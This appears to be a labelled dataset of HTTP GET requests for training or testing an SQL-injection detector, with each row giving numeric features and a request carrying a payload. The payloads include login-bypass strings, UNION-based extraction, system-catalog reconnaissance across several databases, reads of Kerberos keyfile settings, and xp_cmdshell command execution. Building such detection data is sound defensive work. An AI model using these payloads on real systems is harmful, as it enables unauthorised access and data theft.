+63,1,200,5489,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
+63,1,200,2998,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
+63,1,200,1952,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
+63,1,200,6803,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
+35,1,200,4307,7,13,7,2,1,GET login/?id=') or true-- HTTP/1.1
+35,1,200,6262,7,13,7,2,1,GET login/?id=') or true-- HTTP/1.1
+35,1,200,5442,7,13,7,2,1,GET login/?id=') or true-- HTTP/1.1
+28,1,200,1029,7,4,6,1,1,GET ?id=" or 1=1 -- HTTP/1.1
+28,1,200,5064,7,4,6,1,1,GET ?id=" or 1=1 -- HTTP/1.1
+28,1,200,5932,7,4,6,1,1,GET ?id=" or 1=1 -- HTTP/1.1
+28,1,200,6024,7,4,6,1,1,GET ?id=" or 1=1 -- HTTP/1.1
+18,1,200,2077,7,2,4,1,0,GET ?id== HTTP/1.1
+37,1,200,3084,7,9,11,2,1,GET login/?id=' or '1'='1'-- HTTP/1.1
+37,1,200,5065,7,9,11,2,1,GET login/?id=' or '1'='1'-- HTTP/1.1
+37,1,200,6338,7,9,11,2,1,GET login/?id=' or '1'='1'-- HTTP/1.1
+33,1,200,5987,7,4,7,2,1,GET ?id=") or ("1"="1"/* HTTP/1.1
+38,1,200,4850,7,9,7,2,1,GET ?id=admin") or ("1"="1"/* HTTP/1.1
+38,1,200,6203,7,9,7,2,1,GET ?id=admin") or ("1"="1"/* HTTP/1.1
+35,1,200,1264,12,4,7,1,1,GET ?id=' or 1=1 LIMIT 1;# HTTP/1.1
+35,1,200,6345,12,4,7,1,1,GET ?id=' or 1=1 LIMIT 1;# HTTP/1.1
+20,1,200,3643,7,2,4,1,1,GET ?id="^" HTTP/1.1
+20,1,200,2309,7,2,4,1,1,GET ?id="^" HTTP/1.1
+42,1,200,5820,7,14,5,3,1,GET login/?id=admin" or "1"="1"/* HTTP/1.1
+26,2,200,3803,7,7,4,2,2,GET login/?id="&" HTTP/1.1
+43,1,200,4339,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
+43,1,200,1470,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
+43,1,200,6740,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
+43,1,200,5132,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
+43,1,200,4095,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
+43,1,200,7311,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
+43,1,200,1632,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
+35,1,200,1250,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
+35,1,200,7989,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
+26,1,200,4258,7,5,4,1,0,GET ?id= and 1=1¡V HTTP/1.1
+26,1,200,5387,7,5,4,1,0,GET ?id= and 1=1¡V HTTP/1.1
+33,1,200,5298,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
+26,1,200,4025,7,7,5,2,1,GET login/?id=' # HTTP/1.1
+36,1,200,6271,7,9,6,2,1,GET login/?id=") or ("1"="1 HTTP/1.1
+36,1,200,6062,7,9,6,2,1,GET login/?id=") or ("1"="1 HTTP/1.1
+29,1,200,2805,7,4,9,1,1,GET ?id=%' or '0'='0 HTTP/1.1
+57,1,200,5889,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
+57,1,200,5684,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
+57,1,200,2261,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
+57,1,200,3892,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
+57,1,200,7343,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
+57,1,200,5317,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
+57,1,200,2159,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
+45,1,200,1194,7,14,8,2,1,GET login/?id=' or 1=1 limit 1 -- -  HTTP/1.1
+45,1,200,7341,7,14,8,2,1,GET login/?id=' or 1=1 limit 1 -- -  HTTP/1.1
+31,1,200,7700,7,9,4,2,1,GET login/?id=" or 1=1 HTTP/1.1
+50,1,200,1198,7,15,13,1,1,GET ?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
+56,1,200,3400,21,14,8,2,1,GET login/?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
+56,1,200,6003,21,14,8,2,1,GET login/?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
+56,1,200,5695,21,14,8,2,1,GET login/?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
+28,1,200,4676,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
+28,1,200,2088,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
+36,1,200,2437,7,11,10,2,1,GET login/?id=') or ('x'='x HTTP/1.1
+34,1,200,5371,7,11,4,2,1,GET login/?id=" or "x"="x HTTP/1.1
+34,1,200,7453,7,11,4,2,1,GET login/?id=" or "x"="x HTTP/1.1
+34,1,200,5655,7,11,4,2,1,GET login/?id=" or "x"="x HTTP/1.1
+24,1,200,1634,7,7,4,2,1,GET login/?id=' HTTP/1.1
+24,1,200,4911,7,7,4,2,1,GET login/?id=' HTTP/1.1
+26,1,200,1960,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
+32,1,200,3805,7,9,8,2,1,GET login/?id=' or ''=' HTTP/1.1
+30,1,200,4572,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
+30,1,200,4562,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
+30,1,200,7550,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
+30,1,200,6680,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
+20,1,200,5585,7,2,4,1,1,GET ?id="-" HTTP/1.1
+20,1,200,5219,7,2,4,1,1,GET ?id="-" HTTP/1.1
+37,1,200,6835,7,9,12,1,1,GET ?id=admin') or '1'='1'-- HTTP/1.1
+32,1,200,3829,7,11,5,2,1,GET login/?id=' or a=a¡V HTTP/1.1
+31,1,200,7614,7,4,10,2,1,GET ?id=' or '1'='1'/* HTTP/1.1
+20,1,200,3557,7,2,6,1,1,GET ?id='^' HTTP/1.1
+30,1,200,1550,7,4,5,1,1,GET ?id=" or "1"="1"# HTTP/1.1
+30,1,200,3327,7,4,5,1,1,GET ?id=" or "1"="1"# HTTP/1.1
+24,1,200,2797,7,7,4,2,0,GET login/?id== HTTP/1.1
+24,1,200,1513,7,7,4,2,0,GET login/?id== HTTP/1.1
+24,1,200,6733,7,7,4,2,0,GET login/?id== HTTP/1.1
+39,1,200,2864,7,16,6,2,1,GET login/?id=' or uid like '% HTTP/1.1
+75,1,200,2599,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
+75,1,200,6346,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
+75,1,200,1878,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
+63,1,200,2039,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
+63,1,200,6751,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
+63,1,200,5228,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
+63,1,200,4082,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
+63,1,200,3653,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
+34,1,200,7299,7,11,8,2,1,GET login/?id=' or 'a'='a HTTP/1.1
+59,1,200,5352,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
+59,1,200,3003,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
+59,1,200,3621,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
+56,1,200,3898,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
+56,1,200,5232,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
+38,1,200,5324,7,11,9,2,1,GET login/?id='or 1=1 or ''=' HTTP/1.1
+61,1,200,4346,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
+61,1,200,7548,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
+61,1,200,6049,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
+33,1,200,6784,7,9,4,2,1,GET login/?id=" or 0=0 ¡V HTTP/1.1
+44,1,200,5881,7,14,12,3,1,GET login/?id=admin') or ('1'='1'/* HTTP/1.1
+44,1,200,4804,7,14,12,3,1,GET login/?id=admin') or ('1'='1'/* HTTP/1.1
+44,1,200,3138,7,14,12,3,1,GET login/?id=admin') or ('1'='1'/* HTTP/1.1
+34,1,200,3893,7,9,9,1,1,GET ?id=admin') or '1'='1 HTTP/1.1
+20,1,200,3070,7,2,5,1,1,GET ?id=' ' HTTP/1.1
+20,1,200,4883,7,2,5,1,1,GET ?id=' ' HTTP/1.1
+36,1,200,2432,7,14,4,2,1,GET login/?id=admin" or 1=1 HTTP/1.1
+58,1,200,5996,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
+58,1,200,4748,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
+58,1,200,3501,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
+64,1,200,2246,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
+64,1,200,4545,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
+64,1,200,1209,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
+31,1,200,2781,7,9,6,2,2,GET login/?id=or 1=1-- HTTP/1.1
+27,1,200,4615,7,4,6,1,1,GET ?id=' or 0=0 # HTTP/1.1
+26,1,200,6813,7,4,4,1,1,GET ?id=" or ""^" HTTP/1.1
+43,1,200,4760,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
+43,1,200,3156,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
+43,1,200,2391,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
+43,1,200,7966,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
+43,1,200,7302,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
+32,1,200,3815,7,9,5,2,1,GET login/?id=" or 1=1# HTTP/1.1
+33,1,200,7514,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
+33,1,200,6847,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
+33,1,200,2033,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
+33,1,200,5709,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
+33,1,200,4517,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
+33,1,200,1409,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
+33,1,200,6787,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
+37,1,200,3720,7,14,5,2,1,GET login/?id=admin" or 1=1# HTTP/1.1
+37,1,200,6048,7,14,5,2,1,GET login/?id=admin" or 1=1# HTTP/1.1
+37,1,200,5621,7,9,6,2,1,GET login/?id=") or "1"="1"# HTTP/1.1
+37,1,200,6129,7,9,6,2,1,GET login/?id=") or "1"="1"# HTTP/1.1
+41,1,200,1067,7,14,5,2,1,GET login/?id=admin" or "1"="1"# HTTP/1.1
+53,1,200,5789,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
+53,1,200,6063,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
+53,1,200,5435,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
+53,1,200,5441,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
+53,1,200,7316,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
+35,1,200,1963,7,9,9,2,1,GET login/?id=') or '1'='1 HTTP/1.1
+35,1,200,4861,7,9,9,2,1,GET login/?id=') or '1'='1 HTTP/1.1
+62,1,200,3007,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
+27,1,200,5641,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
+27,1,200,4458,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
+26,1,200,6214,7,7,5,3,1,GET login/?id='/* HTTP/1.1
+26,1,200,6808,7,7,5,3,1,GET login/?id='/* HTTP/1.1
+25,1,200,5830,7,7,5,1,1,GET ?id=admin' # HTTP/1.1
+35,1,200,6001,7,13,6,2,1,GET login/?id=") or true-- HTTP/1.1
+33,1,200,4099,7,9,5,2,1,GET login/?id=' or 0=0 ¡V HTTP/1.1
+32,1,200,1148,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
+35,1,200,3362,7,9,7,2,1,GET login/?id=) or '1¡¬='1¡V HTTP/1.1
+28,1,200,6251,7,4,7,1,1,GET ?id=' or 1=1 -- HTTP/1.1
+28,1,200,4192,7,4,7,1,1,GET ?id=' or 1=1 -- HTTP/1.1
+27,1,200,4487,7,4,7,1,1,GET ?id=' or 1=1;# HTTP/1.1
+33,1,200,3681,7,11,7,2,1,GET login/?id=' or a=a-- HTTP/1.1
+33,1,200,1382,7,11,7,2,1,GET login/?id=' or a=a-- HTTP/1.1
+37,1,200,2476,7,9,6,2,1,GET ?id=admin") or "1"="1"/* HTTP/1.1
+35,1,200,5908,7,9,6,1,1,GET ?id=admin") or ("1"="1 HTTP/1.1
+35,1,200,7199,7,9,6,1,1,GET ?id=admin") or ("1"="1 HTTP/1.1
+35,1,200,6677,7,9,6,1,1,GET ?id=admin") or ("1"="1 HTTP/1.1
+31,1,200,2608,7,9,5,3,2,GET login/?id=or 1=1/* HTTP/1.1
+31,1,200,3415,7,4,5,2,1,GET ?id=" or "1"="1"/* HTTP/1.1
+20,1,200,2980,7,2,4,2,1,GET ?id="/* HTTP/1.1
+33,1,200,5164,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
+33,1,200,6818,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
+41,1,200,2251,7,14,10,2,1,GET login/?id=admin') or ('1'='1 HTTP/1.1
+32,1,200,5032,7,6,9,1,1,GET ?id='or 1=1 or ''=' HTTP/1.1
+34,1,200,1284,7,9,4,2,1,GET login/?id=" or "1"="1 HTTP/1.1
+34,1,200,3100,7,9,4,2,1,GET login/?id=" or "1"="1 HTTP/1.1
+26,1,200,7714,7,4,4,1,0,GET ?id= or 0=0 ¡V HTTP/1.1
+26,1,200,4448,7,4,4,1,0,GET ?id= or 0=0 ¡V HTTP/1.1
+68,1,200,5765,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
+68,1,200,2249,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
+68,1,200,2579,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
+68,1,200,5948,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
+49,1,200,5572,7,23,7,1,1,GET ?id=' group by username having 1=1-- HTTP/1.1
+49,1,200,1288,7,23,7,1,1,GET ?id=' group by username having 1=1-- HTTP/1.1
+33,1,200,2257,7,9,6,3,1,GET login/?id=' or 1=1/* HTTP/1.1
+33,1,200,7494,7,9,6,3,1,GET login/?id=' or 1=1/* HTTP/1.1
+33,1,200,5126,7,9,6,3,1,GET login/?id=' or 1=1/* HTTP/1.1
+28,1,200,6287,7,6,4,1,1,GET ?id=" or "x"="x HTTP/1.1
+28,1,200,1194,7,6,8,1,1,GET ?id=' or 'a'='a HTTP/1.1
+33,1,200,3395,7,9,6,2,2,GET login/?id= or 0=0 -- HTTP/1.1
+37,1,200,7516,7,9,11,2,1,GET login/?id=') or '1'='1'# HTTP/1.1
+38,1,200,3702,7,9,12,2,1,GET login/?id=') or ('1'='1'# HTTP/1.1
+38,1,200,1959,7,9,12,2,1,GET login/?id=') or ('1'='1'# HTTP/1.1
+81,1,200,7101,24,15,8,1,1,GET ?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
+81,1,200,7916,24,15,8,1,1,GET ?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
+36,1,200,4305,7,9,11,1,1,GET ?id=admin' or '1'='1'-- HTTP/1.1
+25,1,200,5317,7,4,5,1,0,GET ?id= or 1=1# HTTP/1.1
+30,1,200,7556,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
+43,1,200,4911,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
+32,1,200,4098,7,9,8,2,1,GET login/?id=' or ''^' HTTP/1.1
+42,1,200,3577,7,14,6,2,1,GET login/?id=admin") or "1"="1"# HTTP/1.1
+42,1,200,7843,7,14,6,2,1,GET login/?id=admin") or "1"="1"# HTTP/1.1
+42,1,200,7905,7,14,6,2,1,GET login/?id=admin") or "1"="1"# HTTP/1.1
+55,1,200,7565,7,28,7,2,1,GET login/?id=' group by password having 1=1-- HTTP/1.1
+26,1,200,1809,7,7,4,2,1,GET login/?id=' ¡V HTTP/1.1
+41,1,200,2128,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
+41,1,200,7501,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
+41,1,200,5307,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
+41,1,200,1930,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
+41,1,200,5025,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
+41,1,200,5028,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
+34,1,200,6768,7,9,6,2,1,GET login/?id=" or 1=1 -- HTTP/1.1
+30,1,200,1093,7,4,8,1,1,GET ?id=) or ('1¡¬='1¡V HTTP/1.1
+31,1,200,6486,7,4,11,1,1,GET ?id=') or '1'='1'# HTTP/1.1
+42,1,200,5278,7,14,6,2,1,GET login/?id=admin" or "1"="1"-- HTTP/1.1
+34,1,200,2365,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
+37,1,200,7564,7,11,9,1,1,GET ?id=admin'or 1=1 or ''=' HTTP/1.1
+20,2,200,1640,7,2,6,1,1,GET ?id='&' HTTP/1.1
+34,1,200,3494,7,9,6,2,1,GET login/?id=" or 0=0 -- HTTP/1.1
+34,1,200,7555,7,9,6,2,1,GET login/?id=" or 0=0 -- HTTP/1.1
+36,1,200,7526,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
+36,1,200,6549,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
+30,1,200,6210,7,9,4,1,1,GET ?id=admin" or 1=1 HTTP/1.1
+30,1,200,5578,7,9,4,1,1,GET ?id=admin" or 1=1 HTTP/1.1
+36,1,200,2432,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
+26,1,200,2196,7,4,4,1,1,GET ?id=" or 1=1¡V HTTP/1.1
+50,1,200,7546,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
+50,1,200,6720,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
+50,1,200,5653,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
+39,1,200,3251,7,9,7,3,1,GET login/?id=") or ("1"="1"/* HTTP/1.1
+57,1,200,2585,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
+57,1,200,5691,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
+41,1,200,7182,7,18,6,2,1,GET login/?id=' or uname like '% HTTP/1.1
+27,1,200,2198,7,4,6,1,1,GET ?id=" or 1=1-- HTTP/1.1
+27,1,200,3424,7,4,5,1,1,GET ?id=' or 1=1 ¡V HTTP/1.1
+27,1,200,5714,7,4,5,1,1,GET ?id=' or 1=1 ¡V HTTP/1.1
+57,1,200,6878,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
+57,1,200,1671,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
+57,1,200,2515,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
+29,1,200,1447,7,8,7,1,1,GET ?id=') or true-- HTTP/1.1
+29,1,200,1226,7,8,7,1,1,GET ?id=') or true-- HTTP/1.1
+37,1,200,4214,7,14,6,2,1,GET login/?id=admin' or 1=1# HTTP/1.1
+40,1,200,7299,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
+25,1,200,1602,7,7,4,1,1,GET ?id=admin" # HTTP/1.1
+36,1,200,3399,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
+32,1,200,2222,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
+32,1,200,1414,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+32,1,200,5293,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
+30,1,200,4320,7,4,10,1,1,GET ?id=') or ('1'='1 HTTP/1.1
+27,1,200,3416,7,7,5,2,1,GET login/?id=" -- HTTP/1.1
+26,1,200,4514,7,4,6,1,1,GET ?id=' or 1=1# HTTP/1.1
+26,1,200,2098,7,4,6,1,1,GET ?id=' or 1=1# HTTP/1.1
+28,1,200,1599,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
+27,1,200,6217,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
+27,1,200,2779,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
+20,1,200,4898,7,2,6,1,1,GET ?id='-' HTTP/1.1
+36,1,200,6839,7,9,5,2,1,GET login/?id=" or "1"="1"# HTTP/1.1
+38,1,200,7099,7,9,12,2,1,GET login/?id=') or '1'='1'-- HTTP/1.1
+41,1,200,5041,12,9,7,2,1,GET login/?id=' or 1=1 LIMIT 1;# HTTP/1.1
+31,1,200,6000,7,9,6,1,1,GET ?id=admin' or 1=1# HTTP/1.1
+30,1,200,4916,7,9,5,2,0,GET login/?id=or 1=1# HTTP/1.1
+30,1,200,7644,7,9,5,2,0,GET login/?id=or 1=1# HTTP/1.1
+94,1,200,5452,17,55,7,2,1,GET login/?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
+67,1,200,1114,7,36,10,3,1,GET login/?id=admin' and substring(password/text()_1_1)='7 HTTP/1.1
+33,1,200,4233,7,11,8,1,1,GET ?id=' and 'one'='one HTTP/1.1
+32,1,200,2027,7,4,6,2,1,GET ?id=") or "1"="1"/* HTTP/1.1
+27,1,200,6520,7,4,5,1,1,GET ?id=' or 0=0 ¡V HTTP/1.1
+36,1,200,1022,7,6,12,1,1,GET ?id=")) or (("x"))=(("x HTTP/1.1
+36,1,200,1594,7,6,12,1,1,GET ?id=")) or (("x"))=(("x HTTP/1.1
+36,1,200,4797,7,9,6,1,1,GET ?id=admin") or "1"="1"# HTTP/1.1
+26,2,200,2885,7,4,8,1,1,GET ?id=' or ''&' HTTP/1.1
+37,1,200,1347,7,9,7,1,1,GET ?id=admin") or ("1"="1"# HTTP/1.1
+37,1,200,4135,7,9,7,1,1,GET ?id=admin") or ("1"="1"# HTTP/1.1
+32,1,200,7870,7,10,4,2,0,GET login/?id= and 1=1¡V HTTP/1.1
+24,1,200,3350,7,4,6,1,1,GET ?id='or'1=1 HTTP/1.1
+32,1,200,2162,7,6,8,1,1,GET ?id=") or ("x")=("x HTTP/1.1
+32,1,200,5403,7,6,8,1,1,GET ?id=") or ("x")=("x HTTP/1.1
+26,1,200,7727,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
+26,1,200,1682,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
+26,1,200,3187,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
+32,1,200,1115,7,9,4,2,1,GET login/?id=" or ""*" HTTP/1.1
+32,1,200,6708,7,4,12,1,1,GET ?id=') or '1'='1'-- HTTP/1.1
+25,1,200,7142,7,4,6,1,1,GET ?id='or'1=1¡¬ HTTP/1.1
+25,1,200,4875,7,4,6,1,1,GET ?id='or'1=1¡¬ HTTP/1.1
+27,1,200,2917,7,4,5,2,1,GET ?id=" or 1=1/* HTTP/1.1
+34,1,200,5525,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
+37,1,200,7819,7,9,5,3,1,GET login/?id=" or "1"="1"/* HTTP/1.1
+39,1,200,5153,7,15,8,2,1,GET login/?id=' or 'one'='one¡V HTTP/1.1
+32,1,200,6788,7,9,5,3,2,GET login/?id= or 1=1/* HTTP/1.1
+29,1,200,1961,7,4,9,1,1,GET ?id=') or '1'='1 HTTP/1.1
+31,1,200,6322,7,4,11,1,1,GET ?id=' or '1'='1'-- HTTP/1.1
+21,1,200,4114,7,2,6,1,1,GET ?id=' -- HTTP/1.1
+37,1,200,2338,7,9,6,2,1,GET login/?id=" or "1"="1"-- HTTP/1.1
+37,1,200,1092,7,9,6,2,1,GET login/?id=" or "1"="1"-- HTTP/1.1
+30,1,200,5801,7,6,10,1,1,GET ?id=') or ('x'='x HTTP/1.1
+31,1,200,1617,7,13,3,2,1,GET login/?id= or true HTTP/1.1
+20,1,200,6118,7,2,4,1,1,GET ?id=" # HTTP/1.1
+31,1,200,4923,7,9,5,2,0,GET login/?id= or 1=1# HTTP/1.1
+20,1,200,5155,7,2,5,2,1,GET ?id='/* HTTP/1.1
+37,1,200,1943,7,9,11,2,1,GET ?id=admin') or '1'='1'/* HTTP/1.1
+44,1,200,6247,7,14,7,3,1,GET login/?id=admin") or ("1"="1"/* HTTP/1.1
+39,1,200,2706,7,16,8,2,1,GET login/?id=' and 'one'='one HTTP/1.1
+25,1,200,2455,7,7,5,2,1,GET ?id=admin'/* HTTP/1.1
+75,1,200,6450,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
+27,1,200,6227,7,5,6,1,1,GET ?id=' and 1='1 HTTP/1.1
+26,1,200,1503,7,4,5,1,1,GET ?id=" or 1=1# HTTP/1.1
+87,1,200,3987,24,20,4,2,1,GET login/?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
+32,1,200,6024,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
+39,1,200,1302,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
+31,1,200,1468,7,9,4,2,0,GET login/?id= or 1=1¡V HTTP/1.1
+32,1,200,7928,7,6,5,1,1,GET ?id="or 1=1 or ""=" HTTP/1.1
